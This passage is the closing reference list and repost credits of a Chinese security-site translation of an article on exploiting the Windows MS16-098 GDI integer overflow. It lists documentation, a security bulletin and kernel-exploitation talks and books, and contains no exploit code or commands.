[6] Device Context Types: <https://msdn.microsoft.com/en-us/library/windows/desktop/dd183560(v=vs.85).aspx>

[7] Memory Device Context: <https://msdn.microsoft.com/en-us/library/windows/desktop/dd145049(v=vs.85).aspx>

[8] <https://technet.microsoft.com/library/security/MS16-098>

[9] <https://www.amazon.co.uk/Guide-Kernel-Exploitation-Attacking-Core/dp/1597494860>

[10] Windows Kernel Exploitation : This Time Font hunt you down in 4 bytes –
Keen Team: <http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes>

[11] Windows Graphics Programming: Win32 GDI and DirectDraw:
<https://www.amazon.com/exec/obidos/ASIN/0130869856/fengyuancom>

[12] Abusing GDI objects for ring0 exploit primitives reloaded:
<https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf>

本文翻译自sensepost.com [原文链接](https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Ox9A82** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/85302](/post/id/85302)

安全客 - 有思想的安全新媒体

本文转载自: [sensepost.com](https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/)

如若转载,请注明出处： <https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhmsg.com/dm/200_200_100/t01ae2ab9a52b1881a6.jpg) Ox9A82

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

